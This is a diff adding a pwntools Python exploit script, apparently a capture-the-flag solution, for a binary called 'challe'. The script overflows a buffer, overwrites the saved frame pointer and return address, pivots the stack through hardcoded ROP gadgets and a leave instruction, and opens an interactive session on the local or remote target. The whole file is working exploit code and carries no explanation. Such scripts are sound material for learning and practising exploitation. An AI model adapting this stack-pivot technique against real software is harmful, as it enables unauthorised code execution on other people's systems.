@@ -1,0 +1,81 @@
+#!/usr/bin/python3
+from pwn import *
+
+if args.REMOTE:
+    sla = lambda delim, data: p.sendlineafter(delim, data, timeout=3)
+    sa = lambda delim, data: p.sendafter(delim, data, timeout=3)
+    s = lambda data: p.send(data)
+    sl = lambda data: p.sendline(data)
+    r = lambda nbytes: p.recv(nbytes, timeout=3)
+    ru = lambda data: p.recvuntil(data, timeout=3)
+    rl = lambda : p.recvline(timeout=3)
+else:
+    sla = lambda delim, data: p.sendlineafter(delim, data)
+    sa = lambda delim, data: p.sendafter(delim, data)
+    s = lambda data: p.send(data)
+    sl = lambda data: p.sendline(data)
+    r = lambda nbytes: p.recv(nbytes)
+    ru = lambda data: p.recvuntil(data)
+    rl = lambda : p.recvline()
+
+
+elf = context.binary = ELF('challe', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+base = None
+def int_from_bytes(bytes):
+    return int.from_bytes(bytes, byteorder='little')
+def get_exe_base(pid):
+    maps_file = f"/proc/{pid}/maps"
+    exe_base = None
+
+    with open(maps_file, 'r') as f:
+        exe_base = int(f.readline().split('-')[0], 16)
+
+    if exe_base is None:
+        raise Exception("Executable base address not found.")
+    
+    return exe_base
+
+def GDB(proc):
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript=f'''
+                   b *0x4011B7
+                    c
+                    b*0x4011b7
+                    c
+                    ''')
+
+if args.REMOTE:
+    p = remote(sys.argv[1], sys.argv[2])
+else:
+    p = process()
+    #base = get_exe_base(p.pid)
+context.terminal = ["foot"]
+MOV_RDI_RSI = 0x000000000040115a #: mov rdi, rsi ; ret
+POP_RSI = 0x0000000000401165 #: pop rsi ; ret
+NEW_RBP2 = 0x404078
+POP_RBP = 0x000000000040113d
+PIECE = 0x00000000040119A
+gads = flat(
+        # MOV_RDI_RSI,
+        POP_RBP,
+        NEW_RBP2,
+        PIECE
+
+        )
+gads = gads.ljust(0x60,b"A")
+NEW_RBP = 0x404500
+TARGET = 0x40119A
+payload = b'A'*0x60 + p64(NEW_RBP)
+payload += p64(TARGET)
+GDB(p)
+sl(payload)
+LEAVE = 0x4011B6
+payload = gads  + p64(NEW_RBP - 0x60 - 8) + p64(LEAVE)
+sl(payload)
+input()
+sl(p8(0xf0))
+
+
+
+p.interactive()
